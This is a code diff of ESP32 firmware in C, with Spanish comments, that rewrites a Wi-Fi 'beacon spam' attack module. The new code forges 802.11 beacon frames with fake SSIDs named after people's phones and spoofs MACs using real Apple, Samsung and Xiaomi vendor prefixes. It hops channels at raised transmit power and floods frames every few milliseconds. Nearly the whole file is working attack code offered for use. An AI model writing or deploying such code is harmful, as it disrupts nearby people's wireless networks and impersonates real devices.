@@ -5,17 +5,30 @@
  *      Author: nicotina
  */
 
-#include <stdio.h>
+#include <stdint.h>
 #include <string.h>
 #include "esp_random.h"
-#include "wifi.h"
+#include "esp_wifi.h"
+#include "freertos/task.h"
+#include "nvs_flash.h"
 
+#define BEACON_INTERVAL_MS 5
+#define MAX_SSIDS 30
+#define SSID_LEN 32
+
+char beacon_ssids[SSID_LEN * MAX_SSIDS] = { 0 };
+
+const uint8_t channels[] = {1,6,11};
+uint8_t chidx = 0;
 const char *TAG = "attack:beacon_spam:";
+
+
+uint8_t wifi_channel = 1;
 
 const char* nombres[20] = {
     "Juan",
-    "María",
-    "José",
+    "Maria",
+    "Jose",
     "Ana",
     "Luis",
     "Carmen",
@@ -24,9 +37,9 @@ const char* nombres[20] = {
     "Jorge",
     "Marta",
     "Carlos",
-    "Lucía",
+    "Lucia",
     "Antonio",
-    "Sofía",
+    "Sofia",
     "Miguel",
     "Elena",
     "Francisco",
@@ -37,20 +50,20 @@ const char* nombres[20] = {
 
 
 const char* apellidos[20] = {
-    "García",
-    "Martínez",
-    "Rodríguez",
-    "López",
-    "Hernández",
-    "González",
-    "Pérez",
-    "Sánchez",
-    "Ramírez",
+    "Garcia",
+    "Martinez",
+    "Rodriguez",
+    "Lopez",
+    "Hernandez",
+    "Gonzalez",
+    "Perez",
+    "Sanchez",
+    "Ramirez",
     "Torres",
     "Flores",
     "Rivera",
-    "Gómez",
-    "Díaz",
+    "Gomez",
+    "Diaz",
     "Cruz",
     "Morales",
     "Ortiz",
@@ -82,107 +95,162 @@ const char* celulares[20] = {
     "LG V60"
 };
 
+
+// Beacon packet modificado con parámetros optimizados para móviles
 uint8_t beaconPacket[109] = {
-  /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00, // Type/Subtype: managment beacon frame
-  /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
-  /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
-  /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
+    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,             // Type/Subtype: managment beacon frame
+    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination: broadcast
+    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
+    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source
+    
+    // Fixed parameters
+    /* 22 - 23 */ 0x00, 0x00,                         // Fragment & sequence number
+    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
+    /* 32 - 33 */ 0x32, 0x00,                         // Beacon Interval: 50ms
+    /* 34 - 35 */ 0x01, 0x00,                         // Capabilities Info: ESS
 
-  // Fixed parameters
-  /* 22 - 23 */ 0x00, 0x00, // Fragment & sequence number (will be done by the SDK)
-  /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
-  /* 32 - 33 */ 0xe8, 0x03, // Interval: 0x64, 0x00 => every 100ms - 0xe8, 0x03 => every 1s
-  /* 34 - 35 */ 0x31, 0x00, // capabilities Tnformation
+    // Tagged parameters
+    
+    // SSID parameters
+    /* 36 - 37 */ 0x00, 0x20,                         // SSID parameter set, length 32
+    /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
+                  0x20, 0x20, 0x20, 0x20,
 
-  // Tagged parameters
+    // Supported Rates
+    /* 70 - 71 */ 0x01, 0x08,                         // Tag: Supported Rates, length
+    /* 72 */ 0x82,                                    // 1(B)
+    /* 73 */ 0x84,                                    // 2(B)
+    /* 74 */ 0x8b,                                    // 5.5(B)
+    /* 75 */ 0x96,                                    // 11(B)
+    /* 76 */ 0x24,                                    // 18
+    /* 77 */ 0x30,                                    // 24
+    /* 78 */ 0x48,                                    // 36
+    /* 79 */ 0x6c,                                    // 54
 
-  // SSID parameters
-  /* 36 - 37 */ 0x00, 0x20, // Tag: Set SSID length, Tag length: 32
-  /* 38 - 69 */ 0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20,
-  0x20, 0x20, 0x20, 0x20, // SSID
-
-  // Supported Rates
-  /* 70 - 71 */ 0x01, 0x08, // Tag: Supported Rates, Tag length: 8
-  /* 72 */ 0x82, // 1(B)
-  /* 73 */ 0x84, // 2(B)
-  /* 74 */ 0x8b, // 5.5(B)
-  /* 75 */ 0x96, // 11(B)
-  /* 76 */ 0x24, // 18
-  /* 77 */ 0x30, // 24
-  /* 78 */ 0x48, // 36
-  /* 79 */ 0x6c, // 54
-
-  // Current Channel
-  /* 80 - 81 */ 0x03, 0x01, // Channel set, length
-  /* 82 */      0x01,       // Current Channel
-
-  // RSN information
-  /*  83 -  84 */ 0x30, 0x18,
-  /*  85 -  86 */ 0x01, 0x00,
-  /*  87 -  90 */ 0x00, 0x0f, 0xac, 0x02,
-  /*  91 -  92 */ 0x02, 0x00,
-  /*  93 - 100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04, /*Fix: changed 0x02(TKIP) to 0x04(CCMP) is default. WPA2 with TKIP not supported by many devices*/
-  /* 101 - 102 */ 0x01, 0x00,
-  /* 103 - 106 */ 0x00, 0x0f, 0xac, 0x02,
-  /* 107 - 108 */ 0x00, 0x00
+    // Channel
+    /* 80 - 81 */ 0x03, 0x01,                         // Channel set, length
+    /* 82 */      0x01                                // Current Channel
 };
 
-void generar_ssid(uint8_t *out) {
-	uint32_t random = esp_random();
-	uint8_t nombreidx = (random)    %20;
-	uint8_t apeidx    = (random>>8) %20;
-	uint8_t celuidx   = (random>>16)%20;
-	int lencel = strlen(celulares[celuidx]);
-	int lenape = strlen(apellidos[apeidx]);
-	int lennom = strlen(nombres[nombreidx]);
-	memcpy(out, celulares[nombreidx], lencel);
-	memcpy(out + lencel, " de ", 4);
-	memcpy(out + lencel + 4, apellidos[apeidx], lenape);
-	memcpy(out + lencel + 4 + lenape, nombres[nombreidx], lennom);
-	out[32] = '\0';
-	out[31] = '\n';
+void generar_ssid(char *out) {
+    uint32_t random = esp_random();
+    uint8_t nombreidx = (random)    % 20;
+    uint8_t apeidx    = (random>>8) % 20;
+    uint8_t celuidx   = (random>>16)% 20;
+    
+    memset(out, 0, SSID_LEN);
+    snprintf(out, SSID_LEN, "%s de %s %s", 
+             celulares[celuidx], 
+             nombres[nombreidx], 
+             apellidos[apeidx]);
+    
+    size_t len = strlen(out);
+    if (len >= SSID_LEN) len = SSID_LEN - 1;
+    out[len] = '\0';  // Aseguramos null-termination
 }
 
 void generar_mac(uint8_t *out) {
-	int i;
-	for(i = 0; i < 6; ++i) {
-		out[i] = random()%256;
-	}
+    static const uint8_t ouis[][3] = {
+        {0x00, 0x0C, 0xE7},  // MediaTek
+        {0x00, 0x23, 0xA7},  // Samsung
+        {0x00, 0x23, 0x76},  // HTC
+        {0x00, 0x26, 0x08},  // Apple
+        {0x48, 0x74, 0x6E},  // Apple
+        {0xB8, 0x53, 0xAC},  // Apple
+        {0x5C, 0x51, 0x88},  // Xiaomi
+        {0x8C, 0xBE, 0xBE},  // Xiaomi
+    };
+    
+    // Usar OUIs reales para el inicio de la MAC
+    int oui_idx = esp_random() % (sizeof(ouis)/sizeof(ouis[0]));
+    memcpy(out, ouis[oui_idx], 3);
+    
+    // Generar últimos 3 bytes aleatorios
+    esp_fill_random(out + 3, 3);
 }
 
-void send_random_beacon() {
-	uint8_t mac[6];
-	uint8_t ssid[32] = { 0 };
-	
-	generar_mac(mac);
-	
-	uint32_t random = esp_random();
-	
-	generar_ssid(ssid);
-	
-	
-	uint8_t ssid_len = (uint8_t)strlen((char *)ssid);
-	beaconPacket[37] = ssid_len;
-	
-	memcpy(beaconPacket + 38, ssid, 32);
-	memcpy(beaconPacket + 10, ssid, 6);
-	memcpy(beaconPacket + 16, ssid, 6);
-	
-	ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false));
+void siguiente_canal() {
+    wifi_channel = channels[chidx];
+    chidx = (chidx + 1) % sizeof(channels);
+    esp_wifi_set_channel(wifi_channel, WIFI_SECOND_CHAN_NONE);
+}
+
+void iniciar_wifi_raw() {
+    // Inicializar el NVS primero
+    ESP_ERROR_CHECK(nvs_flash_init());
+    
+    // Configurar WiFi con parámetros optimizados
+    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
+    
+    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
+    ESP_ERROR_CHECK(esp_wifi_start());
+    
+    // Configuraciones adicionales
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
+    ESP_ERROR_CHECK(esp_wifi_set_max_tx_power(84));
+    
+    // Deshabilitar el power save
+    esp_wifi_set_ps(WIFI_PS_NONE);
+}
+
+void attack_beacon_spam_task(void *pvParameters) {
+    uint8_t mac[6];
+    uint32_t sequence = 0;
+    
+    while (true) {
+        siguiente_canal();
+        
+        for (int i = 0; i < MAX_SSIDS; ++i) {
+            generar_mac(mac);
+            
+            memcpy(beaconPacket + 10, mac, 6);
+            memcpy(beaconPacket + 16, mac, 6);
+            memcpy(beaconPacket + 38, beacon_ssids + SSID_LEN*i, SSID_LEN);
+            beaconPacket[82] = wifi_channel;
+            
+            beaconPacket[22] = sequence & 0xFF;
+            beaconPacket[23] = (sequence >> 8) & 0xFF;
+            sequence++;
+            
+            for (int j = 0; j < 3; j++) {
+                esp_wifi_80211_tx(WIFI_IF_AP, beaconPacket, sizeof(beaconPacket), false);
+                vTaskDelay(pdMS_TO_TICKS(5));  // 5ms entre envíos
+            }
+            
+            // Pequeño delay entre SSIDs
+            vTaskDelay(pdMS_TO_TICKS(2));
+        }
+        
+        // Regenerar un SSID aleatorio cada ciclo
+        int idx = esp_random() % MAX_SSIDS;
+        generar_ssid(beacon_ssids + SSID_LEN*idx);
+        
+        vTaskDelay(pdMS_TO_TICKS(BEACON_INTERVAL_MS));
+    }
 }
 
 void attack_beacon_spam() {
-	iniciar_wifi(TAG, WIFI_MODE_AP);
-	int i;
-	while (true) {
-		send_random_beacon();
-		vTaskDelay(500 / portTICK_PERIOD_MS);
-	}
-	
+    iniciar_wifi_raw();
+    
+    // Generar SSIDs iniciales
+    for (int i = 0; i < MAX_SSIDS; ++i) {
+        generar_ssid(beacon_ssids + SSID_LEN*i);
+    }
+    
+    xTaskCreatePinnedToCore(
+        attack_beacon_spam_task,
+        "beacon_spam",
+        4096,
+        NULL,
+        5,
+        NULL,
+        0
+    );
 }
